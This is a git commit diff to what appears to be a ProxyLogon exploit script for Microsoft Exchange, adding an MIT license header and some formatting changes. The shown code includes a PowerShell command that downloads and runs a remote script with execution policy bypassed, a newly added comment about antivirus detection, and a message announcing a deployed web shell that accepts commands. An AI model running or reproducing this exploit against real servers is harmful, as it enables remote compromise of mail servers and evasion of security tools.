e56c85c7cd9e5a493cbdb116542f285825cddc92
NumbFrank <gazlockwood@gmail.com>
2021-03-16 11:10:59 +0000

    Added MIT header

--- proxylogon.py
+++ proxylogon.py
@@ -1,4 +1,24 @@
-#!/usr/bin/python3
+# ProxyLogon
+# Copyright (C) 2021 Gareth Lockwood, Immersive Labs
+# https://github.com/Immersive-Labs-Sec/ProxyLogon
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
 
 import argparse
 import random
@@ -19,7 +39,7 @@ class ProxyLogon:
         self.ps_script_url = (
             ""
             if revPSScriptUrl == None
-            else "powershell -exec bypass -nop -c IEX (new-object net.webclient).downloadstring('%s') "
+            else "powershell -exec bypass -nop -c IEX (new-object net.webclient).downloadstring('%s') "  # AV will catch this consider updating
             % (revPSScriptUrl)
         )
         self.user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
@@ -246,7 +266,9 @@ class ProxyLogon:
             json=OAB_Payload,
             verify=False,
         )
-        print("Shell ready, you can post extra commands to this with 'request' parameter:")
+        print(
+            "Shell ready, you can post extra commands to this with 'request' parameter:"
+        )
         print(self.shell_url)
 
     def ExecCmd(self, command):
@@ -319,7 +341,6 @@ def main():
     args = GetArgs()
     proxyLogon = ProxyLogon(args.target, args.user, args.cmd, args.psurl)
     proxyLogon.run()
-    
 
 
 if __name__ == "__main__":
